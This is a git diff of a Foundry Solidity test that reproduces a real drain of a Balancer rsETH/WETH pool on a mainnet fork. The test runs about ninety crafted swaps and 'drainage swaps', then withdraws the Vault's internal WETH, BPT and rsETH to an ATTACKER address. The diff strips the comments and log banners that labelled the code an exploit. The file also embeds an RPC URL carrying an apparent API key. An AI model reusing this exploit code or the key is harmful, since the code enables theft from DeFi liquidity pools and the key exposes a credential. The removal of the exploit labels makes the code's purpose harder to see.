@@ -4,11 +4,6 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
-/**
- * @title Balancer rsETH/WETH Pool Exploit
- * @dev Transaction: 0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c
- */
-
 interface IBalancerVault {
     enum SwapKind { GIVEN_IN, GIVEN_OUT }
     enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }
@@ -75,7 +70,6 @@ interface IWETH is IERC20 {
 contract BalancerRsEthWethPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
-    // Pool 1: rsETH/WETH (Ethereum)
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     bytes32 constant POOL_ID_RSETH = 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f;
     address constant rsETH_WETH_BPT = 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D;
@@ -97,9 +91,6 @@ contract BalancerRsEthWethPoolTest is Test {
             "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
             23717101
         );
-
-        console.log("Pool: rsETH/WETH (0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f)");
-        console.log("Transaction: 0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c");
 
         (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
 
@@ -217,7 +208,6 @@ contract BalancerRsEthWethPoolTest is Test {
         swaps[88] = ExactSwapData({ tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 11685959850500587629, indexIn: 1, indexOut: 0 });
         swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 2, indexOut: 0 });
 
-        console.log("=== EXECUTING EXACT SWAPS ===");
         console.log("Total swaps:", swaps.length);
         console.log("All swaps use kind=GIVEN_OUT (specify output, pay variable input)");
 
@@ -319,7 +309,7 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("Additional drainage swaps:", additionalSwaps);
 
         // Check internal balances in Vault
-        console.log("=== VAULT INTERNAL BALANCES (BEFORE WITHDRAWAL) ===");
+        console.log("=== VAULT (BEFORE WITHDRAWAL) ===");
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(address(WETH));
         internalTokens[1] = IERC20(rsETH_WETH_BPT);
@@ -400,7 +390,6 @@ contract BalancerRsEthWethPoolTest is Test {
             console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
             console.log("  Internal rsETH:", internalBalancesAfter[2], "wei");
 
-            console.log("=== WITHDRAWAL PROOF ===");
             console.log("WETH withdrawn:", internalBalances[0] / 1e18, "ETH");
             console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
             console.log("rsETH withdrawn:", internalBalances[2] / 1e18, "ETH");
@@ -432,7 +421,6 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("rsETH:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("=== DRAINAGE SUMMARY ===");
         console.log("Total swaps executed:", successCount + additionalSwaps);
         console.log("SUCCESS!");
     }
